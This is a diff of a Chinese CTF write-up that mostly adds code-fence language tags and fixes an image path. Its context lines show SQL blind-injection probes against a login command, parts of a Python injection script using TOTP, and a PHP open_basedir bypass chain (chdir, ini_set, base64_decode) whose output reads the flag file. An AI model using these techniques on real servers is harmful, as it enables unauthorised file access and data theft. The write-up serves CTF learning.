@@ -28,7 +28,7 @@ open_basedir绕过
 
 打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md
 
-```
+```bash
 login [username] [password]
 logout
 launch
@@ -38,7 +38,7 @@ destruct
 
 fuzz后发现要登入，登入抓包的时候发现有一个totp参数
 
-```
+```http
 GET /shell.php?a=login%20admin%20admin&totp=59858608 HTTP/1.1
 Host: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -53,7 +53,7 @@ Cookie: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt
 
 进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入
 
-```
+```bash
 [de1ta@de1ta-mbp /sandbox]% login admin' admin
 login fail, user not found.
 [de1ta@de1ta-mbp /sandbox]% login admin'# admin
@@ -66,7 +66,7 @@ login first.
 
 查看源码，再main.js发现了数据提交过程，和服务器totp设置
 
-```
+```js
 ···
 /*
 [Developer Notes]
@@ -98,7 +98,7 @@ $.ajax({
 
 编写盲注脚本
 
-```
+```python
 # -*- coding: utf-8 -*-
 # @Time    : 1/14/2020 9:42 PM
 import pyotp
@@ -182,7 +182,7 @@ targeting  还有长度限制，code为2，possition为12。
 
 在phpiofo中设置了open_basedir
 
-![](../pic/37.png)
+![](/pic/37.png)
 
 关于open_basedir
    open_basedir是php.ini中的一个配置选项
@@ -201,7 +201,7 @@ chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ch
 
 附上完整脚本
 
-```
+```python
 # -*- coding: utf-8 -*-
 # @Time    : 1/14/2020 9:42 PM
 import pyotp
@@ -341,7 +341,7 @@ if __name__ == '__main__':
 
 返回结果
 
-```
+```json
 {'code': 0, 'message': 'Initializing launching system...<br>Setting target: $a = "chdir";<br>Reading target: $a = "chdir";<br>Setting target: $b = "img";<br>Reading target: $b = "img";<br>Setting target: $c = "{$a($b)}";<br>Reading target: $c = "1";<br>Setting target: $d = "ini_set";<br>Reading target: $d = "ini_set";<br>Setting target: $e = "open_basedir";<br>Reading target: $e = "open_basedir";<br>Setting target: $f = "..";<br>Reading target: $f = "..";<br>Setting target: $g = "{$d($e,$f)}";<br>Reading target: $g = "/app:/sandbox";<br>Setting target: $h = "{$a($f)}";<br>Reading target: $h = "1";<br>Setting target: $i = "{$a($f)}";<br>Reading target: $i = "1";<br>Setting target: $j = "Ly8v";<br>Reading target: $j = "Ly8v";<br>Setting target: $k = "base64_";<br>Reading target: $k = "base64_";<br>Setting target: $l = "decode";<br>Reading target: $l = "decode";<br>Setting target: $m = "$k$l";<br>Reading target: $m = "base64_decode";<br>Setting target: $n = "{$m($j)}";<br>Reading target: $n = "///";<br>Setting target: $o = "{$d($e,$n)}";<br>Reading target: $o = "..";<br>Setting target: $p = "flag";<br>Reading target: $p = "flag";<br>Setting target: $q = "file_get";<br>Reading target: $q = "file_get";<br>Setting target: $r = "_contents";<br>Reading target: $r = "_contents";<br>Setting target: $s = "$q$r";<br>Reading target: $s = "file_get_contents";<br>Setting target: $t = "{$s($p)}";<br>Reading target: $t = "flag{dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3}\n";<br>3..2..1..Fire!<br>All 20 missiles are launched...<br>Cruising...<br>Engaging...Bull\'s-eye!<br>All targets are eliminated.<br>'}
 ```
 
